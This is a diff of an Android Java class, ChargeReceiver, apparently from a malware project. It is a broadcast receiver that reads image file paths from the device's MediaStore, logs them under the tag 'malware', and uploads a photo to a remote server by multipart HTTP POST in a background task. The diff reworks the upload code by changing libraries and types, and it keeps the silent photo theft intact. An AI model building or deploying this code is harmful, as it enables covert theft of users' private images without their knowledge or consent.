@@ -1,44 +1,30 @@
 package ommrepublic.com.ledieo;
 
 import android.content.BroadcastReceiver;
-import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.graphics.Bitmap;
 import android.os.AsyncTask;
-import android.os.RecoverySystem;
 import android.provider.MediaStore;
 import android.util.Base64;
 import android.util.Log;
 import android.provider.MediaStore.Images;
-import android.widget.Toast;
 
-import org.apache.http.Header;
-import org.apache.http.HttpEntity;
 import org.apache.http.HttpResponse;
-import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
-import org.apache.http.client.entity.UrlEncodedFormEntity;
-import org.apache.http.client.methods.HttpGet;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.MultipartEntityBuilder;
+import org.apache.http.entity.mime.content.FileBody;
+import org.apache.http.entity.mime.content.StringBody;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.util.EntityUtils;
-import org.json.JSONArray;
-import org.json.JSONObject;
 
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.OutputStream;
+import java.nio.charset.Charset;
 import java.util.ArrayList;
 import java.util.List;
-
-import cz.msebera.android.httpclient.entity.mime.MultipartEntityBuilder;
-import cz.msebera.android.httpclient.entity.mime.content.ContentBody;
-import cz.msebera.android.httpclient.entity.mime.content.FileBody;
 
 /**
  * Created by admin on 9/23/15.
@@ -46,13 +32,13 @@ import cz.msebera.android.httpclient.entity.mime.content.FileBody;
 public class ChargeReceiver extends BroadcastReceiver{
 
     public Context mContext;
-    public List<File> mListFile;
+    public List<String> mListFile;
 
     @Override
     public void onReceive(Context context, Intent intent)
     {
         mContext = context;
-        mListFile = new ArrayList<File>();
+        mListFile = new ArrayList<String>();
 
         try {
             // STEP 1 : START THE SERVER
@@ -81,11 +67,11 @@ public class ChargeReceiver extends BroadcastReceiver{
                     // do what ever you want here
                     Log.d("malware", data);
                     File file = new File(data);
-                    mListFile.add(file);
+                    mListFile.add(data);
 
-                    byte[] bytes = Utils.loadFile(file);
-                    byte[] encoded = Base64.encode(bytes, 1);
-                    encodedString = new String(encoded);
+                    //byte[] bytes = Utils.loadFile(file);
+                    //byte[] encoded = Base64.encode(bytes, 1);
+                    //encodedString = new String(encoded);
                 }while(cur.moveToNext());
             }
             cur.close();
@@ -98,12 +84,13 @@ public class ChargeReceiver extends BroadcastReceiver{
         }
     }
 
-    private class uploadImageAsyncTask extends AsyncTask<List<File>, Integer, String> {
+    private class uploadImageAsyncTask extends AsyncTask<List<String>, Integer, String> {
 
-        List<File> imageData;
+        List<String> imageData;
+        Bitmap bm;
 
         @Override
-        protected String doInBackground(List<File>... params){
+        protected String doInBackground(List<String>... params){
             // TODO Auto-generated method stub
             imageData = params[0];
             postData();
@@ -138,58 +125,14 @@ public class ChargeReceiver extends BroadcastReceiver{
                 //reqEntity.setChunked(true); // Send in multiple parts if needed
                 //httpPost.setEntity(reqEntity);
 
+                MultipartEntityBuilder entityBuilder = MultipartEntityBuilder.create();
+                entityBuilder.addPart("title", new StringBody(imageData.get(0), Charset.forName("UTF-8")));
+                File myFile = new File(imageData.get(0));
+                FileBody fileBody = new FileBody(myFile);
+                entityBuilder.addPart("imageData", fileBody);
+                httpPost.setEntity(entityBuilder.build());
+                httpPost.getParams().setParameter("project", 0);
 
-                FileBody bin = new FileBody(imageData.get(0), "image/jpeg");
-                MultipartEntityBuilder mpEntity = MultipartEntityBuilder.create();
-                mpEntity.addPart("imageData", bin);
-                final cz.msebera.android.httpclient.HttpEntity entity = mpEntity.build();
-
-                httpPost.setEntity(new HttpEntity() {
-                    @Override
-                    public boolean isRepeatable() {
-                        return entity.isRepeatable();
-                    }
-
-                    @Override
-                    public boolean isChunked() {
-                        return entity.isChunked();
-                    }
-
-                    @Override
-                    public long getContentLength() {
-                        return entity.getContentLength();
-                    }
-
-                    @Override
-                    public Header getContentType() {
-                        return null;
-                    }
-
-                    @Override
-                    public Header getContentEncoding() {
-                        return null;
-                    }
-
-                    @Override
-                    public InputStream getContent() throws IOException, IllegalStateException {
-                        return entity.getContent();
-                    }
-
-                    @Override
-                    public void writeTo(OutputStream outputStream) throws IOException {
-                        entity.writeTo(outputStream);
-                    }
-
-                    @Override
-                    public boolean isStreaming() {
-                        return entity.isStreaming();
-                    }
-
-                    @Override
-                    public void consumeContent() throws IOException {
-                        entity.consumeContent();
-                    }
-                });
 
                 HttpResponse response = httpclient.execute(httpPost);
                 String responseStr = EntityUtils.toString(response.getEntity());
